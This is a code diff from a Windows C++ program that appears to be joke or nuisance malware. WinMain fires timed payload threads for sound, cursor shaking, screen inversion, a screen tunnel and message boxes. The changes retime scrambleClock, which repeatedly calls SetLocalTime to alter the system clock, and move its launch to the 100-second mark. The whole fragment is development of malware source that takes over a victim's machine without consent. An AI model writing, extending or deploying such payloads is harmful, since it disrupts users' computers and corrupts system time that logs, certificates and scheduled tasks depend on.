@@ -226,7 +226,7 @@ void scrambleClock() {
         st.wMilliseconds = 0;
 
         SetLocalTime(&st);                   // Apply system-wide change
-        std::this_thread::sleep_for(std::chrono::milliseconds(100)); // 0.1s interval
+        std::this_thread::sleep_for(std::chrono::milliseconds(200)); // 0.2s interval
     }
 }
 
@@ -397,7 +397,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     std::this_thread::sleep_for(std::chrono::seconds(15));
     std::thread(soundPayload).detach();
     std::thread(cursorShakingPayload).detach();
-    std::thread(scrambleClock).detach();
 
     // 40 Seconds - Start search payload and cursor trail
     std::this_thread::sleep_for(std::chrono::seconds(20));
@@ -414,9 +413,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     std::this_thread::sleep_for(std::chrono::seconds(20));
     std::thread(invertScreen).detach();
 
-    // 100 Seconds - Start screen tunnel effect
+    // 100 Seconds - Start screen tunnel effect & scramble clock
     std::this_thread::sleep_for(std::chrono::seconds(20));
     std::thread(screenTunnel).detach();
+    std::thread(scrambleClock).detach();
 
     // 120 Seconds - Start timed message boxes
     std::this_thread::sleep_for(std::chrono::seconds(20));
